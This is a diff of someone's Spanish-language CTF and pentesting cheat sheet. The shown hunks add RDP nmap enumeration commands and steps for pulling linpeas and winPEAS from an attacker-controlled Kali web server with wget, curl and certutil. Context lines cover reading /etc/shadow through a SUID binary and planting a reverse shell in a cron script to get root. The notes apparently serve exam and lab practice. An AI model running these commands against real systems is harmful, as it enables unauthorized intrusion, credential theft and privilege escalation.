@@ -310,6 +310,7 @@ run post/multi/recon/local_exploit_suggester
 background
 sessions
 
+
 exploits
 
 8080 → TOMCAT
@@ -359,9 +360,27 @@ use exploit/unix/irc/unreal_ircd_3281_backdoor
 set RHOST TARGET
 run
 
-exploits 2
+PUERTO RDP 3389
+nmap -vv -p3389 IP
+nmap -p3389 --script rdp-enum-encryption IP
+nmap -p3389 --script rdp-ntlm-info IP  (TE DICE nombre del host, nombre del dominio, versión de Windows) Saber información del sistema.
+nmap -p3389 -sV --script rdp-* -T4 IP
+
+
+
 
 🔑 ESCALADA PRIVILEGIOS(LINUX)
+Ve al directorio donde está linpeas:
+locate linpeas , SUELE ESTAR EN LOS CTF aquí:   /opt/PEASS-ng/
+python3 -m http.server 8000
+wget http://TU_IP:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+
+
+
+
 
 Buscar SUID:
 
@@ -382,7 +401,7 @@ Ver interfaces de red:
 
 ip a
 
-4 DE FEBRERO HACKING ALEJANDRO
+
 
 4️⃣ USAR LINPEAS
 
@@ -430,7 +449,7 @@ sudo less /etc/passwd
 
 Desde ahí puedes ejecutar shell.
 
-4 DE FEBRERO HACKING ALEJANDRO
+
 
 7️⃣ ENUMERAR BINARIOS SUID
 
@@ -448,7 +467,7 @@ base64 /etc/shadow
 
 Permite leer archivos de root.
 
-4 DE FEBRERO HACKING ALEJANDRO
+
 
 9️⃣ ENUMERAR CRON JOBS (MUY IMPORTANTE EN EXAMEN)
 
@@ -477,13 +496,8 @@ Editar script:
 nano backup.sh
 
 Insertar reverse shell.
-
-
-
 1️⃣2️⃣ DAR PERMISOS
 chmod +x backup.sh
-
-
 
 1️⃣3️⃣ LISTENER EN KALI
 
@@ -500,35 +514,31 @@ Cuando se ejecute el cron job → shell root.
 PREPARAR WINPEAS EN KALI
 
 Ir al directorio:
-
 cd /usr/share/peass
+Ubicación típica en Kali--> En Kali suele estar en:
 
-Ver herramientas:
+/opt/PEASS-ng/
 
 ls
-
 Entrar en winpeas:
-
 cd winpeas
 
-Ver archivos:
-
-ls -lah
-
-16 DE FEBRERO HACKING ALEJANDRO
 
 4️⃣ LEVANTAR SERVIDOR WEB EN KALI
 python3 -m http.server 8080
 5️⃣ DESCARGAR WINPEAS EN WINDOWS
 curl -O http://IPKALI:8080/winPEASany_ofs.exe
-
+o tmb muy común en CTF:
+certutil -urlcache -split -f http://TU_IP:8000/winPEASx64.exe winpeas.exe
 Comprobar:
-
 dir
-
 Ejecutar:
 
 winPEASany_ofs.exe
+
+Cómo saber si la máquina es x64 o x86
+En la víctima puedes mirar con:
+systeminfo
 
 ----------------------------------------------
 ESCALADAPRIVILEGIOS WINDOWS (ORDEN REAL)
